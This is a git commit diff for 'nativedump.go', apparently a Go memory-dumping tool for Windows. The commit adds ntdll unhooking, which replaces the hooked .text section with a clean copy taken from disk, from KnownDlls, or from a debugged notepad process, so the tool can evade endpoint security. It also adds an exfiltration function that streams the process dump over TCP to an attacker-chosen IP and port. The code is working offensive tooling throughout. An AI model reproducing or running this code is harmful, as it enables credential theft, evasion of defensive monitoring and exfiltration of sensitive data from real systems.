5ce0b7b4d11712e02af3e3cc2c0c6e4fbd60296a
Ricardo Ruiz <ricardojruiz93@gmail.com>
2024-07-12 13:32:08 +0200

    Add files via upload

--- nativedump.go
+++ nativedump.go
@@ -4,6 +4,8 @@ package main
 import (
 	"os"
 	"fmt"
+	"net"
+    "flag"
 	"unsafe"
 	"strings"
 	"syscall"
@@ -12,7 +14,6 @@ import (
 	"crypto/rand"
 	"unicode/utf8"
 	"unicode/utf16"
-	//"encoding/json"
 	"encoding/binary"
 	"golang.org/x/sys/windows"
 )
@@ -37,6 +38,11 @@ const (
 	flink_buffer_offset uintptr = 0x50
 	flink_buffer_fulldllname_offset uintptr = 0x40
 	letters = "abcdefghijklmnopqrstuvwxyz"
+	PAGE_EXECUTE_WRITECOPY uintptr = 0x80
+    SEC_IMAGE_NO_EXECUTE uintptr = 0x11000000
+    offset_mappeddll uintptr = 0x1000
+    SECTION_MAP_READ uintptr = 0x04
+    DEBUG_PROCESS uint32 = 0x01
 )
 
 var (
@@ -49,7 +55,15 @@ var (
 	ntOpenProcessToken *windows.LazyProc
 	ntAdjustPrivilegesToken *windows.LazyProc
 	ntClose *windows.LazyProc
+	ntOpenSection *windows.LazyProc
 	getProcessImageFileName *windows.LazyProc
+	VirtualProtect *windows.LazyProc
+    createFile *windows.LazyProc
+    createFileMapping *windows.LazyProc
+    mapViewOfFile *windows.LazyProc
+    DebugActiveProcessStop *windows.LazyProc
+    TerminateProcess *windows.LazyProc
+    CreateProcess *windows.LazyProc
 )
 
 
@@ -64,12 +78,12 @@ type RTL_OSVERSIONINFOW struct {
 }
 
 type OBJECT_ATTRIBUTES struct {
-	Length                   uint32
-	RootDirectory            uintptr
-	ObjectName               uintptr
-	Attributes               uint32
-	SecurityDescriptor       uintptr
-	SecurityQualityOfService uintptr
+    Length                   uint32
+    RootDirectory            windows.Handle
+    ObjectName               *UNICODE_STRING
+    Attributes               uint32
+    SecurityDescriptor       uintptr
+    SecurityQualityOfService uintptr
 }
 
 type CLIENT_ID struct {
@@ -131,6 +145,40 @@ type Mem64Information struct {
 	Field1	uint32    `json:"field1"`
 }
 
+type UNICODE_STRING struct {
+    Length        uint16
+    MaximumLength uint16
+    Buffer        *uint16
+}
+
+type STARTUPINFO struct {
+    cb            uint32
+    lpReserved    *uint16
+    lpDesktop     *uint16
+    lpTitle       *uint16
+    dwX           uint32
+    dwY           uint32
+    dwXSize       uint32
+    dwYSize       uint32
+    dwXCountChars uint32
+    dwYCountChars uint32
+    dwFillAttribute uint32
+    dwFlags         uint32
+    wShowWindow     uint16
+    cbReserved2     uint16
+    lpReserved2     *byte
+    hStdInput       windows.Handle
+    hStdOutput      windows.Handle
+    hStdError       windows.Handle
+}
+
+type PROCESS_INFORMATION struct {
+    hProcess    windows.Handle
+    hThread     windows.Handle
+    dwProcessId uint32
+    dwThreadId  uint32
+}
+
 
 func init() {
 	// ntdll
@@ -144,9 +192,22 @@ func init() {
 	ntOpenProcessToken = ntdll.NewProc("NtOpenProcessToken")
 	ntAdjustPrivilegesToken = ntdll.NewProc("NtAdjustPrivilegesToken")
 	ntClose = ntdll.NewProc("NtClose")
+	ntOpenSection = ntdll.NewProc("NtOpenSection")
 	// psapi - Can I do this with ntdll?? :(
 	psapi := windows.NewLazySystemDLL("psapi.dll")
 	getProcessImageFileName = psapi.NewProc("GetProcessImageFileNameA")
+	// kernel32
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	VirtualProtect = kernel32.NewProc("VirtualProtect")
+    createFile = kernel32.NewProc("CreateFileA")
+    createFileMapping = kernel32.NewProc("CreateFileMappingA")
+    mapViewOfFile = kernel32.NewProc("MapViewOfFile")
+    DebugActiveProcessStop = kernel32.NewProc("DebugActiveProcessStop")
+    TerminateProcess = kernel32.NewProc("TerminateProcess")
+    CreateProcess = kernel32.NewProc("CreateProcessW")
+ 
+
+   
 }
 
 
@@ -382,6 +443,22 @@ func writeToFile(file_name string, byteArray []byte) () {
 }
 
 
+func exfiltrate_file(dump_file []byte, ipAddrStr string, portAddrStr string) () {
+	address := net.JoinHostPort(ipAddrStr, portAddrStr)
+	conn, err := net.Dial("tcp", address)
+	if err != nil {
+		fmt.Println("Error connecting to server:", err)
+		return
+	}
+	defer conn.Close()
+	_, err = conn.Write(dump_file)
+	if err != nil {
+		fmt.Println("Error sending data:", err)
+		return
+	}
+}
+
+
 func randomString(length int) (string) {
     result := make([]byte, length)
     for i := range result {
@@ -548,7 +625,275 @@ func get_dump_bytearr(osInfo []OSInformation, moduleinfo_arr []ModuleInformation
 }
 
 
+func get_local_lib_address(dll_name string) uintptr {
+    // GetCurrentProcess
+    proc_handle, _ := windows.GetCurrentProcess()
+    process_handle := uintptr(proc_handle)
+    fmt.Printf("[+] Process Handle: \t%d\n", process_handle)
+    var pbi PROCESS_BASIC_INFORMATION
+    var returnLength uint32
+
+    // NtQueryInformationProcess
+    status, _, _ := ntQueryInformationProcess.Call(uintptr(process_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
+    if status != 0 {
+        fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
+        return 0
+    }
+    fmt.Printf("[+] Process ID: \t%d\n", pbi.UniqueProcessID)
+    fmt.Printf("[+] PEB Base Address: \t0x%x\n", pbi.PebBaseAddress)
+
+    // Ldr Address
+    peb_baseaddress := pbi.PebBaseAddress
+    ldr_pointer := peb_baseaddress + ldr_offset
+    ldr_address := read_remoteintptr(process_handle, ldr_pointer, 8)
+    fmt.Printf("[+] ldr_pointer: \t0x%x\n", ldr_pointer)
+    fmt.Printf("[+] Ldr Address: \t0x%x\n", ldr_address)
+    
+    // next_flink
+    InInitializationOrderModuleList:= ldr_address + inInitializationOrderModuleList_offset
+    next_flink := read_remoteintptr(process_handle, InInitializationOrderModuleList, 8)
+    fmt.Printf("[+] next_flink: \t0x%x\n", next_flink)
+
+    // Loop modules
+    var dll_base uintptr = 1337
+    for dll_base != 0 {
+        next_flink = next_flink - 0x10
+        dll_base = read_remoteintptr(process_handle, (next_flink + flink_dllbase_offset), 8)
+        if (dll_base == 0){
+            break    
+        }
+        buffer := read_remoteintptr(process_handle, (next_flink + flink_buffer_offset), 8)
+        base_dll_name := read_remoteWStr(process_handle, buffer, 256)
+        if (base_dll_name == dll_name){
+            return dll_base
+        }
+        next_flink = read_remoteintptr(process_handle, (next_flink + 0x10), 8)
+    }
+    return 0
+}
+
+
+func get_section_info(base_address uintptr) (uintptr,uintptr) {
+    proc_handle, _ := windows.GetCurrentProcess()
+    process_handle := uintptr(proc_handle)
+    fmt.Printf("[+] Process Handle: \t%d\n", process_handle)
+    var e_lfanew_addr uintptr = base_address + 0x3C
+    var e_lfanew uintptr = read_remoteintptr(process_handle, e_lfanew_addr, 4)
+    var sizeofcode_addr uintptr = base_address + e_lfanew + 24 + 4
+    var sizeofcode uintptr = read_remoteintptr(process_handle, sizeofcode_addr, 4)
+    var baseofcode_addr uintptr  = base_address + e_lfanew + 24 + 20
+    var baseofcode uintptr = read_remoteintptr(process_handle, baseofcode_addr, 4)
+    return baseofcode, sizeofcode
+}
+
+
+func replace_ntdll_section(unhooked_ntdll_text uintptr, local_ntdll_txt uintptr, local_ntdll_txt_size uintptr){
+    var oldProtect uintptr
+    res, _, _ := VirtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, PAGE_EXECUTE_WRITECOPY, uintptr(unsafe.Pointer(&oldProtect)))
+    if res != 1 {
+        fmt.Println("Failed to change memory protection to PAGE_EXECUTE_WRITECOPY")
+        return
+    }
+    /// fmt.Scanln()
+    // Copy bytes to the address
+    for i := uintptr(0); i < local_ntdll_txt_size; i++ {
+        *(*byte)(unsafe.Pointer(local_ntdll_txt + i)) = *(*byte)(unsafe.Pointer(unhooked_ntdll_text + i))
+    }
+    /// fmt.Scanln()
+    // Restore the original protection
+    res, _, _ = VirtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, oldProtect, uintptr(unsafe.Pointer(&oldProtect)))
+    if res != 1 {
+        fmt.Println("Failed to restore the original memory protection")
+        return
+    }
+}
+
+
+func overwrite_disk(file_name string) uintptr {
+    // CreateFileA
+    fileNamePtr, _ := syscall.BytePtrFromString(file_name)
+    file_handle, _, err := createFile.Call(uintptr(unsafe.Pointer(fileNamePtr)), windows.GENERIC_READ, windows.FILE_SHARE_READ, 0, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, 0)
+    if windows.Handle(file_handle) == windows.InvalidHandle {
+        fmt.Printf("Error creating file: %v\n", err)
+        return 0
+    }
+    fmt.Printf("[+] File handle: \t%d\n", file_handle)
+    defer windows.CloseHandle(windows.Handle(file_handle))
+
+    // CreateFileMappingA
+    mapping_handle, _, err := createFileMapping.Call(file_handle, 0, (windows.PAGE_READONLY | SEC_IMAGE_NO_EXECUTE), 0, 0, 0)
+    if mapping_handle == 0 {
+        fmt.Printf("Error creating file mapping: %v\n", err)
+        return 0
+    }
+    defer windows.CloseHandle(windows.Handle(mapping_handle))
+    fmt.Printf("[+] Mapping handle: \t%d\n", mapping_handle)
+
+    // MapViewOfFile
+    unhooked_ntdll, _, err := mapViewOfFile.Call(mapping_handle, windows.FILE_MAP_READ, 0, 0, 0)
+
+    if unhooked_ntdll == 0 {
+        fmt.Printf("Error mapping view of file: %v\n", err)
+        return 0
+    }
+    fmt.Printf("[+] Mapped Ntdll:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll))
+
+    // CloseHandle
+    windows.CloseHandle(windows.Handle(file_handle))
+    windows.CloseHandle(windows.Handle(mapping_handle))
+    
+    // Add Offset
+    var unhooked_ntdll_text uintptr = unhooked_ntdll + offset_mappeddll
+    return unhooked_ntdll_text
+}
+
+
+func overwrite_knowndlls() uintptr {
+    // NtOpenSection
+    var s string = "\\KnownDlls\\ntdll.dll"
+    us := UNICODE_STRING{}
+    us.Length = uint16(len(s) * 2)
+    us.MaximumLength = us.Length + 2
+    us.Buffer = windows.StringToUTF16Ptr(s)
+    oa := OBJECT_ATTRIBUTES{
+        Length:      uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
+        RootDirectory: 0,
+        ObjectName: &us,
+        Attributes: 0,
+    }
+    var section_handle windows.Handle
+    status, _, _ := ntOpenSection.Call(uintptr(unsafe.Pointer(&section_handle)), SECTION_MAP_READ, uintptr(unsafe.Pointer(&oa)))
+    if status != 0 {
+        fmt.Printf("[-] NtOpenSection failed\n")
+        os.Exit(0)
+        return 0
+    }
+    fmt.Printf("[+] Section handle: \t0x%x\n", section_handle)
+
+    // MapViewOfFile
+    unhooked_ntdll, _, err := mapViewOfFile.Call(uintptr(section_handle), uintptr(SECTION_MAP_READ), 0, 0, 0)
+    if unhooked_ntdll == 0 {
+        fmt.Printf("[-] Error mapping view of file: %v\n", err)
+        os.Exit(0)
+        return 0
+    }
+
+    // CloseHandle
+    windows.CloseHandle(windows.Handle(section_handle))
+    
+    // Add offset
+    var unhooked_ntdll_text uintptr = unhooked_ntdll + offset_mappeddll
+    return unhooked_ntdll_text
+}
+
+
+func overwrite_debugproc(file_path string, local_ntdll_txt uintptr, local_ntdll_txt_size uintptr) uintptr {
+    // CreateProcess
+    var si STARTUPINFO
+    var pi PROCESS_INFORMATION
+    si.cb = uint32(unsafe.Sizeof(si))
+    applicationName := windows.StringToUTF16Ptr(file_path)
+
+    success, _, err := CreateProcess.Call(uintptr(unsafe.Pointer(applicationName)), 0, 0, 0, 0, uintptr(DEBUG_PROCESS), 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))   
+    if (success != 1) {
+        fmt.Printf("CreateProcess failed: %v\n", err)
+        os.Exit(0)
+    }
+    
+    // NtReadVirtualMemory: debugged_process ntdll_handle = local ntdll_handle --> debugged_process .text section ntdll_handle = local .text section ntdll_handle
+    buffer := make([]byte, local_ntdll_txt_size)
+    var bytesRead uintptr
+    status, _, _ := ntReadVirtualMemory.Call(uintptr(pi.hProcess), local_ntdll_txt, uintptr(unsafe.Pointer(&buffer[0])), local_ntdll_txt_size, uintptr(unsafe.Pointer(&bytesRead)))
+    if status != 0 {
+        fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
+        os.Exit(0)
+    }
+
+    // TerminateProcess + DebugActiveProcessStop
+    tp_bool, _, _ := TerminateProcess.Call(uintptr(pi.hProcess), 0)
+    daps_bool, _, _ := DebugActiveProcessStop.Call(uintptr(pi.dwProcessId))
+    if (tp_bool != 1){
+        fmt.Printf("[-] TerminateProcess failed")
+        os.Exit(0)
+    }
+    if (daps_bool != 1){
+        fmt.Printf("[-] DebugActiveProcessStop failed")
+        os.Exit(0)
+    }
+
+    return uintptr(unsafe.Pointer(&buffer[0]))
+}
+
+
+func overwrite(optionFlag string, pathFlag string){
+	var local_ntdll uintptr = get_local_lib_address("ntdll.dll")
+    fmt.Printf("[+] Local Ntdll:\t0x%s\n", fmt.Sprintf("%x", local_ntdll))
+    local_ntdll_txt_addr, local_ntdll_txt_size := get_section_info(local_ntdll)
+    fmt.Printf("[+] Local Ntdll Size:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt_size))
+    fmt.Printf("[+] Local Ntdll Addr:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt_addr))
+    var local_ntdll_txt uintptr = local_ntdll + local_ntdll_txt_addr
+    fmt.Printf("[+] Local Ntdll Text:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt))
+    var unhooked_ntdll_text uintptr = 0
+
+    if optionFlag == "disk" {
+        file_name := "C:\\Windows\\System32\\ntdll.dll"
+        if pathFlag != "default" {
+            file_name = pathFlag
+        }
+        fmt.Printf("[+] Option \"disk\" - Getting clean version from file in disk %s\n", file_name)
+        unhooked_ntdll_text = overwrite_disk(file_name)
+        if (unhooked_ntdll_text != 0){
+            fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
+        } else {
+            fmt.Printf("[-] Error getting the .text section address")
+            os.Exit(0)
+        }
+    } else if optionFlag == "knowndlls" {
+        fmt.Println("[+] Option \"knowndlls\" - Getting clean version from KnownDlls folder")
+        unhooked_ntdll_text = overwrite_knowndlls()
+        if (unhooked_ntdll_text != 0){
+            fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
+        } else {
+            fmt.Printf("[-] Error getting the .text section address")
+            os.Exit(0)       
+        }
+    } else if optionFlag == "debugproc" {
+        program_path := "c:\\Windows\\System32\\notepad.exe"
+        if pathFlag != "default" {
+            program_path = pathFlag
+        }
+        fmt.Printf("[+] Option \"debugproc\" - Getting clean version from debugged process %s\n", program_path)
+        unhooked_ntdll_text = overwrite_debugproc(program_path, local_ntdll_txt, local_ntdll_txt_size)
+        if (unhooked_ntdll_text != 0){
+            fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
+        } else {
+            fmt.Printf("[-] Error getting the .text section address")
+            os.Exit(0)       
+        }
+    } else {
+        fmt.Println("[-] Parameter -o (Library overwrite option) is mandatory. Possible values: \"disk\", \"knowndlls\" or \"debugproc\" ")
+        os.Exit(0)
+    }
+    replace_ntdll_section(unhooked_ntdll_text, local_ntdll_txt, local_ntdll_txt_size)
+}
+
+
 func main() {
+	// Ntdll overwrite options
+	var optionFlagStr string
+	var pathFlagStr string
+	var ipAddrStr string
+	var portAddrStr string
+	flag.StringVar(&optionFlagStr, "o", "default", "Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"")
+    flag.StringVar(&pathFlagStr,   "k", "default", "Path to ntdll file in disk (for \"disk\" option) or program to open in debug mode (\"debugproc\" option)")
+    flag.StringVar(&ipAddrStr,     "i", "default", "IP Address for exfiltration")
+    flag.StringVar(&portAddrStr,   "p", "default", "Port for exfiltration")
+    
+    flag.Parse()
+    if (optionFlagStr != "default") {
+    	overwrite(optionFlagStr, pathFlagStr)
+    }
+
 	// OS Information
 	var osVersionInfo RTL_OSVERSIONINFOW
 	osVersionInfo.DwOSVersionInfoSize = uint32(unsafe.Sizeof(osVersionInfo))
@@ -632,6 +977,11 @@ func main() {
 	output_file := "proc_" +  fmt.Sprintf("%d", pid) + ".dmp"
 	
 	// Write to file
-	writeToFile(output_file, dump_file)	
-	fmt.Printf("[+] File %s generated.\n", output_file)
+	if (ipAddrStr != "default" && portAddrStr != "default") {
+		exfiltrate_file(dump_file, ipAddrStr, portAddrStr)
+		fmt.Printf("[+] File exfiltrated.\n")
+	} else{ 
+		writeToFile(output_file, dump_file)	
+		fmt.Printf("[+] File %s generated.\n", output_file)
+	}
 }
